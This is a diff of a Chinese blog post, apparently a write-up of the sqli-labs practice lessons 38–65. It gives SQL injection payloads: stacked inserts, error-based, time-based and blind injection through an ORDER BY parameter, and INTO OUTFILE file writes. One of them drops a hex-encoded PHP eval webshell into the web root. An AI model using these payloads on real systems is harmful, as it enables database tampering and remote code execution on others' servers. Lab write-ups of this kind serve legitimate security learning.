@@ -1,26 +1,11 @@
 <!DOCTYPE html>
-<html>
+<html lang=zh>
 <head>
-    
-
-    
-
-    
-
-
-
+    <!-- so meta -->
     <meta charset="utf-8">
-    
-    
-    
-    
-    <title>sqlilabs38-65 | osword&#39;s blog | 小刀</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    <meta name="theme-color" content="#3F51B5">
-    
-    
-    <meta name="keywords" content="SQL注入">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
     <meta name="description" content="0x01堆栈查询堆栈查询解析堆栈查询，说白了就是在加一个查询语句。但个人认为union 联合注入比较靠谱。 局限性：  堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。 所以延时注入，差错注入都行不通。 条件是使用了mysql_multi_query()&#x2F;&#x2F;为了验证数据库而使用  less38-39less38字符型，less39数字型注入 以less38为例构造">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqlilabs38-65">
@@ -54,366 +39,178 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/1.png">
     
-        <link rel="alternate" type="application/atom+xml" title="osword&#39;s blog" href="/atom.xml">
     
-    <link rel="shortcut icon" href="/favicon.ico">
-    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
-    <script>window.lazyScripts=[]</script>
-
-    <!-- custom head -->
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
     
+    <!-- title -->
+    <title>sqlilabs38-65</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
+    
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-<body>
-    <div id="loading" class="active"></div>
-
-    <aside id="menu" class="hide" >
-  <div class="inner flex-row-vertical">
-    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
-        <i class="icon icon-lg icon-close"></i>
-    </a>
-    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
-      <div class="brand">
-        <a href="/" class="avatar waves-effect waves-circle waves-light">
-          <img src="/img/avatar.jpg">
-        </a>
-        <hgroup class="introduce">
-          <h5 class="nickname">osword</h5>
-          <a href="mailto:929337105@qq.com" title="929337105@qq.com" class="mail">929337105@qq.com</a>
-        </hgroup>
-      </div>
-    </div>
-    <div class="scroll-wrap flex-col">
-      <ul class="nav">
-        
-            <li class="waves-block waves-effect">
-              <a href="/"  >
-                <i class="icon icon-lg icon-home"></i>
-                主页
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/archives"  >
-                <i class="icon icon-lg icon-archives"></i>
-                Archives
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://zhzhdoai.github.io/"  >
-                <i class="icon icon-lg icon-友链"></i>
-                友链
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://glotozz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-glotozz"></i>
-                Glotozz
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://nikoeurus.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-sommus"></i>
-                Sommus
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://mochazz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-mochazz@七月火"></i>
-                Mochazz 七月火
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://tea9.xyz/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-tea9"></i>
-                Tea 9
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://wulidecade.cn/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-Decade"></i>
-                Decade
-              </a>
-            </li>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
         
       </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/12/27/DVWA%E7%B3%BB-Command-Injection/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/12/22/sqlilabs23-28/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&text=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&is_video=false&description=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqlilabs38-65&body=Check out this article: http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&title=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&name=sqlilabs38-65&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/&t=sqlilabs38-65" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
     </div>
-  </div>
-</aside>
-
-    <main id="main">
-        <header class="top-header" id="header">
-    <div class="flex-row">
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
-          <i class="icon icon-lg icon-navicon"></i>
-        </a>
-        <div class="flex-col header-title ellipsis">sqlilabs38-65</div>
-        
-        <div class="search-wrap" id="search-wrap">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
-                <i class="icon icon-lg icon-chevron-left"></i>
-            </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
-                <i class="icon icon-lg icon-search"></i>
-            </a>
-        </div>
-        
-        
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
-            <i class="icon icon-lg icon-share-alt"></i>
-        </a>
-        
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01堆栈查询"><span class="toc-number">1.</span> <span class="toc-text">0x01堆栈查询</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#堆栈查询解析"><span class="toc-number">1.1.</span> <span class="toc-text">堆栈查询解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less38-39"><span class="toc-number">1.2.</span> <span class="toc-text">less38-39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less40-41"><span class="toc-number">1.3.</span> <span class="toc-text">less40-41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less42-45"><span class="toc-number">1.4.</span> <span class="toc-text">less42-45</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-order-by-注入"><span class="toc-number">2.</span> <span class="toc-text">0x02 order by 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#参数注入"><span class="toc-number">2.1.</span> <span class="toc-text">参数注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#less46"><span class="toc-number">2.1.1.</span> <span class="toc-text">less46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-number">2.1.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#延时注入"><span class="toc-number">2.1.3.</span> <span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#函数注入判断"><span class="toc-number">2.1.4.</span> <span class="toc-text">函数注入判断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#procedure-analyse-注入"><span class="toc-number">2.2.</span> <span class="toc-text">procedure analyse 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#导入导出文件"><span class="toc-number">2.3.</span> <span class="toc-text">导入导出文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一句话木马"><span class="toc-number">2.3.1.</span> <span class="toc-text">一句话木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less47-49-见解"><span class="toc-number">2.4.</span> <span class="toc-text">less47-49(见解)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less50-53"><span class="toc-number">2.5.</span> <span class="toc-text">less50-53</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-challenge"><span class="toc-number">3.</span> <span class="toc-text">0x03 challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less54-65-challenge"><span class="toc-number">3.1.</span> <span class="toc-text">less54-65(challenge)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04年终总结"><span class="toc-number">4.</span> <span class="toc-text">0x04年终总结</span></a></li></ol>
     </div>
-</header>
-<header class="content-header post-header">
-
-    <div class="container fade-scale">
-        <h1 class="title">sqlilabs38-65</h1>
-        <h5 class="subtitle">
-            
-                <time datetime="2018-12-23T04:19:35.000Z" itemprop="datePublished" class="page-time">
-  2018-12-23
-</time>
-
-
-            
-        </h5>
-    </div>
+  </span>
+</div>
 
     
-
-
-</header>
-
-
-<div class="container body-wrap">
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
     
-    <aside class="post-widget">
-        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
-            <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x01堆栈查询"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x01堆栈查询</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#堆栈查询解析"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">堆栈查询解析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#less38-39"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">less38-39</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#less40-41"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">less40-41</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#less42-45"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">less42-45</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x02-order-by-注入"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x02 order by 注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#参数注入"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">参数注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#less46"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">less46</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#报错注入"><span class="post-toc-number">2.1.2.</span> <span class="post-toc-text">报错注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#延时注入"><span class="post-toc-number">2.1.3.</span> <span class="post-toc-text">延时注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#函数注入判断"><span class="post-toc-number">2.1.4.</span> <span class="post-toc-text">函数注入判断</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#procedure-analyse-注入"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">procedure analyse 注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#导入导出文件"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">导入导出文件</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#一句话木马"><span class="post-toc-number">2.3.1.</span> <span class="post-toc-text">一句话木马</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#less47-49-见解"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">less47-49(见解)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#less50-53"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">less50-53</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x03-challenge"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x03 challenge</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#less54-65-challenge"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">less54-65(challenge)</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x04年终总结"><span class="post-toc-number">4.</span> <span class="post-toc-text">0x04年终总结</span></a></li></ol>
-        </nav>
-    </aside>
+    <h1 class="posttitle" itemprop="name headline">
+        sqlilabs38-65
+    </h1>
 
 
-<article id="post-sqlilabs38-65"
-  class="post-article article-type-post fade" itemprop="blogPost">
 
-    <div class="post-card">
-        <h1 class="post-card-title">sqlilabs38-65</h1>
-        <div class="post-meta">
-            <time class="post-time" title="2018-12-23 12:19:35" datetime="2018-12-23T04:19:35.000Z"  itemprop="datePublished">2018-12-23</time>
-
-            
-
-
-            
-<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
-    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
-</span>
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">osword's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-12-23T04:19:35.000Z" itemprop="datePublished">2018-12-23</time>
+        
+      
+    </div>
 
 
-        </div>
-        <div class="post-content" id="post-content" itemprop="postContent">
-            <h1 id="0x01堆栈查询"><a href="#0x01堆栈查询" class="headerlink" title="0x01堆栈查询"></a>0x01堆栈查询</h1><h2 id="堆栈查询解析"><a href="#堆栈查询解析" class="headerlink" title="堆栈查询解析"></a>堆栈查询解析</h2><p>堆栈查询，说白了就是在加一个查询语句。但个人认为union 联合注入比较靠谱。</p>
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="0x01堆栈查询"><a href="#0x01堆栈查询" class="headerlink" title="0x01堆栈查询"></a>0x01堆栈查询</h1><h2 id="堆栈查询解析"><a href="#堆栈查询解析" class="headerlink" title="堆栈查询解析"></a>堆栈查询解析</h2><p>堆栈查询，说白了就是在加一个查询语句。但个人认为union 联合注入比较靠谱。</p>
 <p>局限性：</p>
 <ol>
 <li>堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。 所以延时注入，差错注入都行不通。</li>
 <li>条件是使用了<code>mysql_multi_query()</code>//为了验证数据库而使用</li>
 </ol>
 <h2 id="less38-39"><a href="#less38-39" class="headerlink" title="less38-39"></a>less38-39</h2><p>less38字符型，less39数字型注入</p>
-<p>以less38为例<br>构造payload:<code>1&#39;;insert into users values (&#39;39&#39;,&#39;osowrd&#39;,&#39;osowrd&#39;)--+</code><br>成功插入新数据，<code>38 osword osword</code><br>notice：id列数值尽量大，考虑表没有对id添加自增属性</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
+<p>以less38为例<br>构造payload:<code>1&#39;;insert into users values (&#39;39&#39;,&#39;osowrd&#39;,&#39;osowrd&#39;)--+</code><br>成功插入新数据，<code>38 osword osword</code><br>notice：id列数值尽量大，考虑表没有对id添加自增属性<br><img src="./1.png" alt=""></p>
 <h2 id="less40-41"><a href="#less40-41" class="headerlink" title="less40-41"></a>less40-41</h2><ul>
 <li>less40&gt;&gt;注入类型：id=1’)–+  .错误不回显，</li>
 <li>less41&gt;&gt;注入类型：id=1–+,错误不回显，</li>
 </ul>
-<h2 id="less42-45"><a href="#less42-45" class="headerlink" title="less42-45"></a>less42-45</h2><p>42~45都是相同的，区别就是过滤的形式不一样。<br>以less42讲解<br>源码分析:对登陆账户使用<code>mysql_real_escape_string()</code>过滤。<br>而登陆密码却无过滤</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./2.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<p>构造stack injection</p>
+<h2 id="less42-45"><a href="#less42-45" class="headerlink" title="less42-45"></a>less42-45</h2><p>42~45都是相同的，区别就是过滤的形式不一样。<br>以less42讲解<br>源码分析:对登陆账户使用<code>mysql_real_escape_string()</code>过滤。<br>而登陆密码却无过滤<br><img src="./2.png" alt=""><br>构造stack injection</p>
 <p><code>admin=admin</code><br><code>passwd=c&#39;;insert into users values (&#39;40&#39;,&#39;less42&#39;,&#39;less42&#39;)#</code></p>
-<p>成功插入</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./3.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-<h1 id="0x02-order-by-注入"><a href="#0x02-order-by-注入" class="headerlink" title="0x02 order by 注入"></a>0x02 order by 注入</h1><p>从mysql帮助文档可知，<code>order by</code> 后可以添加表达式。可以采用报错注入，延时注入</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./4.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./5.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p>成功插入<br><img src="./3.png" alt=""></p>
+<h1 id="0x02-order-by-注入"><a href="#0x02-order-by-注入" class="headerlink" title="0x02 order by 注入"></a>0x02 order by 注入</h1><p>从mysql帮助文档可知，<code>order by</code> 后可以添加表达式。可以采用报错注入，延时注入<br><img src="./4.png" alt=""><br><img src="./5.png" alt=""></p>
 <h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><h3 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h3><p>借用 <code>order by</code> 后参数注入</p>
 <ol>
 <li>添加注入语句，<code>?sort=(select *****)</code>//需要注意的是sort争对单列来排序，所以select 后检索个数为1.</li>
 <li>利用函数，如rand(),随机出其他字段值<br><code>rand(trure),rand(false)</code>值不同判断条件语句<br><code>?sort=rand(ascii(substr(database()1,1,))=115)</code><br><code>?sort=rand(ascii(substr(database(),1,1))=114)</code></li>
-<li>利用<code>and</code>&gt;&gt; <code>?sort=1 and （加sql语句）</code><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./6.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./7.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-</li>
+<li>利用<code>and</code>&gt;&gt; <code>?sort=1 and （加sql语句）</code><br><img src="./6.png" alt=""><br><img src="./7.png" alt=""></li>
 </ol>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><blockquote>
 <blockquote>
-<p><code>?sort=(select  count(*) from information_schema.columns group by  concat(0x7e,(select user()),0x7e,floor(rand(0)*2)))</code></p>
+<p><code>?sort=(select  count(*) from information_schema.columns group by  concat(0x7e,(select user()),0x7e,floor(rand(0)*2)))</code><br><img src="./8.png" alt=""></p>
 </blockquote>
 </blockquote>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./8.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>?sort=(IF(ascii(substr(database(),1,1))=114),1,sleep(5))//故意整错看效果</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./9.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>?sort=(IF(ascii(substr(database(),1,1))=114),1,sleep(5))//故意整错看效果<br><img src="./9.png" alt=""></p>
 <h3 id="函数注入判断"><a href="#函数注入判断" class="headerlink" title="函数注入判断"></a>函数注入判断</h3><p>rand()&gt;&gt;rand(true) / rand(false)//有表单显示才能判断<br>搭配:<code>?sort=1 and</code> 盲注操作。</p>
-<h2 id="procedure-analyse-注入"><a href="#procedure-analyse-注入" class="headerlink" title="procedure analyse 注入"></a>procedure analyse 注入</h2><p>prodedure analyse在windows下可执行，ubuntu mysql 5.7执行不了，具体原因未可知。<br>windows环境下<br><code>?sort procedure analyse(extractvalue(1,concat(0x3a,database())),1)</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./10.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./11.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-<h2 id="导入导出文件"><a href="#导入导出文件" class="headerlink" title="导入导出文件"></a>导入导出文件</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./12.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<p><code>?sort=1  into outfile &#39;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\1.php&#39;</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./13.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./14.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>利用 <code>lines terminated by</code><br>payload: <code>?sort=1 into outfile &#39;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\less46.php&#39; lines terminated by 3c3f70687020406576616c28245f504f53545b276d696d61275d293f3e</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./15.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./16.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
+<h2 id="procedure-analyse-注入"><a href="#procedure-analyse-注入" class="headerlink" title="procedure analyse 注入"></a>procedure analyse 注入</h2><p>prodedure analyse在windows下可执行，ubuntu mysql 5.7执行不了，具体原因未可知。<br>windows环境下<br><code>?sort procedure analyse(extractvalue(1,concat(0x3a,database())),1)</code><br><img src="./10.png" alt=""><br><img src="./11.png" alt=""></p>
+<h2 id="导入导出文件"><a href="#导入导出文件" class="headerlink" title="导入导出文件"></a>导入导出文件</h2><p><img src="./12.png" alt=""><br><code>?sort=1  into outfile &#39;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\1.php&#39;</code><br><img src="./13.png" alt=""><br><img src="./14.png" alt=""></p>
+<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>利用 <code>lines terminated by</code><br>payload: <code>?sort=1 into outfile &#39;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\less46.php&#39; lines terminated by 3c3f70687020406576616c28245f504f53545b276d696d61275d293f3e</code><br><img src="./15.png" alt=""><br><img src="./16.png" alt=""></p>
 <h2 id="less47-49-见解"><a href="#less47-49-见解" class="headerlink" title="less47-49(见解)"></a>less47-49(见解)</h2><p>基于无错误返回进行注入。延时，盲注都行的通就不一一写了<br>见解：<code>sort=rand()</code>可以判断是否可以添加<code>(select **)</code>和判断整型，<br>若是字符串只能用<code>and</code>注入，或<code>procedure analyse()</code></p>
 <h2 id="less50-53"><a href="#less50-53" class="headerlink" title="less50-53"></a>less50-53</h2><p>PHP中使用了mysql_multi_query()函数，使得能够使用堆栈注入。这里就不演示了</p>
-<h1 id="0x03-challenge"><a href="#0x03-challenge" class="headerlink" title="0x03 challenge"></a>0x03 challenge</h1><h2 id="less54-65-challenge"><a href="#less54-65-challenge" class="headerlink" title="less54-65(challenge)"></a>less54-65(challenge)</h2><p>实则就是增加了对查询次数限制<br>小BUG：页面后退就不会添加查询次数了<br>爆表名&gt;&gt;列名&gt;&gt;得出字段<br>yaon9gl5wo</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./17.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-<p>secret_N3BG</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./18.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-<p>RSIG77DiEpN3UnUgnRgVd5wC</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./19.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<p>往后的就是对less54各种变形就不一一写了。</p>
